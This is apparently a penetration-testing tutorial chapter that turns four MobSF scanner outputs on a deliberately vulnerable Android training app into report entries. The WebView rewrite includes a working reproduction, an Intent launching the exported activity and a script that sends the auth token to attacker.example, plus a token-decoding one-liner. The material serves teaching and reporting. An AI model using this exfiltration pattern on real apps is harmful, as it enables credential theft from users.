# A MobSF finding, and the report entry it should become

Four worked rewrites. Each shows the scanner's output **verbatim on the left of the page** and the
entry that survives a technical review on the right — plus, in each case, the specific work that had
to happen in between.

All four come from the same artefact: `CMPen-Android-App-v1.2.apk`, SHA-256
`137186672dd93517bd6c85637c04c7f7cf912458e3ea9c887072dbbf00c39638`, a public deliberately-vulnerable
training application. The scanner output is quoted from
[`synthetic-mobsf-report.json`](synthetic-mobsf-report.json), which is a hand-built fixture in
MobSF's report shape — **MobSF was not run**; see [README §1.6](../README.md#16-installation-reality--mobsf-was-not-run-here).
Every code line, manifest attribute, hash and decoded value quoted below **was measured** on the
artefact with `aapt2`, `jadx` 1.5.3, `apksigner` and `unzip`.

The rule this file exists to demonstrate:

> **📖 Definition**
> A **scanner output** names a construct. A **finding** names an actor, a reachable path, an asset,
> and a consequence. The distance between the two is the job.

---

## Rewrite 1 — the WebView bridge

### What the scan said

```json
"Insecure WebView Implementation. WebView is configured with addJavascriptInterface,
 which exposes a Java object to JavaScript running in the page.": {
  "files": { "org/android/cmpen/WebViewActivity.java": "15" },
  "metadata": {
    "cvss": 8.8,
    "cwe": "CWE-749 Exposed Dangerous Method or Function",
    "owasp-mobile": "M1: Improper Platform Usage",
    "masvs": "MSTG-PLATFORM-7",
    "severity": "high"
  }
}
```

Everything in that block except `"files"` is **rule metadata**. The CVSS 8.8 is attached to the
*rule*; it is the same 8.8 for every application that ever matched it, including the ones where the
WebView only ever loads a bundled `file:///android_asset/help.html`. It is not a measurement of this
app.

### The work in between

Three questions, one file, about eight minutes.

```bash
# host - open what the report actually cited, instead of quoting the report
sed -n '10,22p' out/sources/org/android/cmpen/WebViewActivity.java
```

```java
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        WebView webView = new WebView(this);
        setContentView(webView);
        webView.getSettings().setJavaScriptEnabled(true);                       // line 14
        webView.addJavascriptInterface(new WebAppInterface(), "AndroidBridge"); // line 15
        String stringExtra = getIntent().getStringExtra("load_url");            // line 17
        if (stringExtra == null) {
            stringExtra = "data:text/html,<html><body><h3>Secure Vault WebView</h3>...";
        }
        webView.loadUrl(stringExtra);                                           // line 20
    }
```

| Question | Answer | Where it came from |
|---|---|---|
| Is the construct real? | Yes, line 15 | The cited line, opened |
| What does the bridge expose? | `getAuthToken()`, returning a decoded token | `WebAppInterface.java:9-11` |
| Can an attacker control the loaded URL? | **Yes** — `load_url` is an Intent extra, unvalidated | Line 17, plus the manifest |
| Who can send that Intent? | **Any app on the device** | `aapt2`: `WebViewActivity` has `exported="true"` |

The fourth row is the one MobSF cannot produce, because it lives in a different section of its own
report. The code rule fired on `WebViewActivity.java`; the export lives in `manifest_analysis`. Two
sections, one finding — and joining them is a human act. That is the entire argument of
[README §5.4](../README.md#54-the-join-mobsf-does-not-make).

```bash
# host - the token the bridge hands out, in one command
python3 -B -c "import base64;print(bytes(b^0x5A for b in base64.b64decode('PDY7PSEwagtvDRUvPjJoEjwREg0SERNsYzwLNjQTMyMrEwkROyc=')).decode())"
```

### The report entry

> **F-03 — Any installed application can drive the app's WebView and read its auth token (High)**
>
> **Artefact.** `CMPen-Android-App-v1.2.apk`, SHA-256 `13718667…c39638`.
>
> **What we found.** `org.android.cmpen.WebViewActivity` is declared `android:exported="true"` in the
> shipped manifest, with no permission. In `onCreate` it enables JavaScript
> (`WebViewActivity.java:14`), binds a Java object into the page under the name `AndroidBridge`
> (`:15`), then loads a URL taken directly from the Intent extra `load_url` with no scheme or host
> validation (`:17`, `:20`). The bound object exposes one `@JavascriptInterface` method,
> `getAuthToken()`, which returns a token the application obfuscates with base64 and a single-byte
> XOR (`WebAppInterface.java:10`, `B/g.java:36-38`).
>
> **Why it matters.** These three facts compose. Any application installed on the same device — with
> **no permissions of its own** — can start this Activity with a `load_url` extra pointing at a page
> the attacker controls. That page runs in the victim app's WebView, calls
> `AndroidBridge.getAuthToken()`, and posts the result anywhere. There is no user interaction beyond
> the Activity appearing, and no prompt.
>
> **Reproduction.**
> ```bash
> # from an unprivileged attacker app (NOT from adb shell - shell is not an app;
> # see 60-ADB on why a shell result does not prove app reachability)
> startActivity(new Intent()
>     .setClassName("org.android.cmpen", "org.android.cmpen.WebViewActivity")
>     .putExtra("load_url", "https://attacker.example/steal.html"));
> ```
> ```html
> <!-- steal.html -->
> <script>fetch('https://attacker.example/c?t=' + AndroidBridge.getAuthToken())</script>
> ```
>
> **Severity: High.** Reachable by any co-installed application, requiring no permission and no user
> consent, yielding a bearer credential. It is not Critical because exploitation requires the
> attacker to already have code running on the device.
>
> **Fix.**
> ```kotlin
> // 1. do not export a WebView host that takes its URL from the caller
> // AndroidManifest.xml
> <activity android:name=".WebViewActivity" android:exported="false" />
>
> // 2. if it must be exported, allow-list the destination - never the caller's string
> private val ALLOWED = setOf("help.example.com", "www.example.com")
> val uri = Uri.parse(intent.getStringExtra("load_url") ?: DEFAULT)
> if (uri.scheme != "https" || uri.host !in ALLOWED) { finish(); return }
>
> // 3. do not put a credential behind @JavascriptInterface at all. If the page
> //    needs authenticated data, fetch it natively and postMessage the RESULT.
> ```
>
> **What we did not test.** Whether the token is accepted by the server, and for how long. That
> requires the backend and is out of scope for artefact analysis.

**Length ratio: the scanner produced 6 lines; the finding is 40.** That is the correct ratio, and it
is why a 200-item scanner export is not a 200-finding report.

---

## Rewrite 2 — the finding the scan got backwards

### What the scan said

```json
{ "title": "This application does not implement certificate pinning",
  "description": "No certificate pinning implementation was detected. Certificate pinning is
                  recommended for applications handling sensitive data.",
  "section": "network" }
```

A **negative** claim, in the `secure`/`warning` band, where nobody looks twice. It is the most
dangerous shape a scanner output can take, because a reader has no reason to check it.

### The work in between

One command, from [36-CertificatePinning §8.2](../../36-CertificatePinning/README.md#82-doing-it-by-hand):

```bash
# host - the 43-character form. 'grep sha256/' alone hits every OkHttp app;
# the 43 base64 characters plus '=' are what make this a CONFIGURED pin value
mkdir -p /tmp/dexes && unzip -o -j CMPen-Android-App-v1.2.apk 'classes*.dex' -d /tmp/dexes
grep -a -o -h -E 'sha256/[A-Za-z0-9+/]{43}=' /tmp/dexes/*.dex | sort -u
# sha256/+xpjwBQ7+BLhq1r+/AU3qLNIaXPt+JgXAJ9yIQaHNkQ=
```

And the site, once you know what to look for:

```java
// out/sources/b/h.java:20-27  -- class names are R8 output, not the developer's
static {
    t tVar = new t();                                   // OkHttpClient.Builder
    m.d dVar = new m.d(0);                              // CertificatePinner.Builder
    dVar.f117a.add(new m.e(new String[]{                // CertificatePinner.Pin
        "sha256/+xpjwBQ7+BLhq1r+/AU3qLNIaXPt+JgXAJ9yIQaHNkQ="}[0]));
    m.g gVarB = dVar.b();
    tVar.f212q = gVarB;
    f19a = new u(tVar);                                 // the shared OkHttpClient
}
```

The cause is not a bug in the scanner. It is a **structural limit of name-based detection**: the
rule looks for the type `okhttp3.CertificatePinner`, R8 renamed it to `m.e`, and the name is gone
from the DEX. The pin *value* is a string literal, and R8 does not rename string literals.

The controlled comparison ships next door.
[`synthetic-mobsf-report-v1.0.json`](synthetic-mobsf-report-v1.0.json) describes **the same
application one version earlier**, built without R8. There the same detector succeeds, and its
scorecard says `"This application implements certificate pinning"` in the `secure` band. Same
mechanism, same three-line construction, opposite scanner verdict — and the only variable is
obfuscation.

### The report entry

There is no *finding* here — the app pins, which is correct behaviour. What there is, is a
**correction that has to appear somewhere**, because the client will read the scan too.

> **N-02 — Note on automated pinning detection (Informational)**
>
> The automated scan reports that this application does not implement certificate pinning. **That is
> incorrect.** The application configures one SPKI pin for `ninja.secops.group`
> (`sha256/+xpjwBQ7…HNkQ=`) on a process-wide `OkHttpClient`, constructed in a static initialiser.
> The scanner's rule matches the type name `okhttp3.CertificatePinner`; R8 renamed that type, so the
> rule found nothing. Version 1.0 of the same application, which ships unobfuscated, is detected
> correctly by the identical rule.
>
> **Why we are telling you.** Two reasons, and the second is the important one. First, a "no pinning"
> line in a report becomes a remediation ticket to add pinning that already exists. Second, and worse:
> if you accept this scanner's negative claims, you will also accept them for controls that genuinely
> are missing, and you have no way to tell those cases apart.
>
> **What we did instead.** Mapped all four pinning layers (DEX pin values, `<pin-set>` in the network
> security config, custom `TrustManager`, native) per our standard method. Result: one configured pin
> value, one layer. **Presence of a pin is still not proof of enforcement** — that requires observing
> a handshake being rejected, which is recorded separately under our dynamic testing section.

---

## Rewrite 3 — the severity the scan got the wrong way round

### What the scan said

```json
{ "rule": "exported_protected_permission_normal",
  "title": "Content Provider (org.android.cmpen.FlagProvider) is Protected by a permission,
            but the protection level of the permission should be checked.",
  "severity": "info" }
```

Rated **info**, because a permission is present. Read the title again: the tool is explicitly telling
you it has not done the check. In a 39-item report, nobody reads that sentence.

### The work in between

```bash
# host - resolve the level. It is declared in THIS manifest, four elements above.
aapt2 dump xmltree --file AndroidManifest.xml CMPen-Android-App-v1.2.apk | grep -A2 'E: permission'
```

```
      E: permission (line=23)
        A: ...:name(0x01010003)="org.android.cmpen.permission.ACCESS_FLAG"
        A: ...:protectionLevel(0x01010009)=0x00000000
```

`0x00000000` is `normal`. A `normal` permission is granted at install time to **any application that
asks for it**, with no user prompt and no signature check. The guard is a formality.

The chapter's validator makes exactly this call, and it is the only place in the whole run where it
raises a severity rather than lowering one:

```
V004  [INFO]  manifest
  claim     Content Provider (org.android.cmpen.FlagProvider) is Protected by a permission...
    FOR     provider declares a permission
    AGAINST permission org.android.cmpen.permission.ACCESS_FLAG has protectionLevel=normal
            - ANY app can hold it, so the provider is effectively unprotected
  VERDICT   UNDER-RATED
```

### The report entry

> **F-02 — Exported content provider guarded by an install-time permission (Medium)**
>
> `org.android.cmpen.FlagProvider` (authority `org.android.cmpen.flagprovider`) is exported with
> `android:readPermission="org.android.cmpen.permission.ACCESS_FLAG"`. That permission is declared in
> the same manifest with `android:protectionLevel="normal"`, so the platform grants it at install
> time to any application that declares `<uses-permission>` for it — with no user prompt, no
> signature match and no runtime consent. The provider's `query()` returns a row containing a
> base64-encoded token that decodes in one command.
>
> **The scanner rated this Informational** on the grounds that a permission was declared. Presence of
> a permission is not protection; the protection level is the control, and this one is the weakest
> level the platform offers.
>
> **Fix.** `android:protectionLevel="signature"` if the caller is a sibling application you sign, or
> `android:exported="false"` if nothing outside the app needs it. Changing the level of an
> already-published permission is a breaking change for existing holders — see
> [23-Permissions](../../23-Permissions/README.md) on the install-order behaviour before shipping it.

---

## Rewrite 4 — the item that should not be in the report at all

Not every rewrite produces a finding. Most produce a **rejection**, and the rejection is a
deliverable.

### What the scan said

```json
{ "rule": "vulnerable_os_version",
  "title": "App can be installed on a vulnerable Android version. [minSdk=24]",
  "severity": "warning",
  "description": "This application can be installed on an older version of Android that has
                  multiple unfixed vulnerabilities." }
```

### The work in between

Ask one question: *which* vulnerability, and how does this application touch it? The rule fires on an
integer comparison. It names no CVE, no reachable weakness, and no platform behaviour this app
depends on. Any answer you give will be one you invented.

### What goes in the report

Nothing, in the findings section. This goes in **Appendix B, the rejected-leads ledger** — see
[`findings-ledger.csv`](findings-ledger.csv):

```
V011 | minSdk=24 "vulnerable Android version" | REJECTED |
     The rule fires on an integer. It names no weakness, no CVE and no platform
     behaviour this application depends on. minSdk is a support decision.
     Reporting it wastes the client's remediation budget and costs you credibility
     on the items that matter.
```

> **🔍 Pentester's Note**
> Publishing the ledger is not an admission that you found little. It is the only evidence a reader
> has that the items you *did* report were selected rather than transcribed. A report showing
> "39 scanner items worked down to 8 findings, with a reason against each of the 31 rejections" is
> read completely differently from a report showing 8 findings and nothing else — and it takes about
> ninety minutes to produce.

---

## The four rewrites, side by side

| # | Scanner said | Report says | What changed it |
|---|---|---|---|
| 1 | `addJavascriptInterface`, CVSS 8.8, high | Any app can drive the WebView and read the auth token — High | Joining a **code** finding to a **manifest** finding, and reading the bridge method |
| 2 | "does not implement certificate pinning" | It does pin; the detector was defeated by R8 renaming | One `grep` for the 43-character pin value |
| 3 | "protected by a permission", info | Guarded by an install-time permission any app can hold — Medium | Resolving `protectionLevel=0x00000000` |
| 4 | "vulnerable Android version", warning | *Rejected, with the reason recorded* | Asking which vulnerability |

Two of the four moved **up**, one moved **down**, and one was **inverted**. That distribution is the
argument against reading a scanner's severity as a severity at all: the errors do not point in one
direction, so you cannot correct for them with a blanket discount.

---

## Related

| File | What it is |
|---|---|
| [`synthetic-mobsf-report.json`](synthetic-mobsf-report.json) | The fixture these quotes come from |
| [`synthetic-mobsf-report-v1.0.json`](synthetic-mobsf-report-v1.0.json) | The same app, unobfuscated — the controlled comparison in rewrite 2 |
| [`findings-ledger.csv`](findings-ledger.csv) | Every item, including the 15 rejections |
| [`validate-output-cmpen-v1.2.txt`](validate-output-cmpen-v1.2.txt) | The unedited validator run |
| [`../scripts/mobsf-validate.py`](../scripts/mobsf-validate.py) | The tool that gathered the evidence quoted above |
| [80-Appendix](../../80-Appendix/README.md) | The report template and the severity rubric this chapter does not restage |
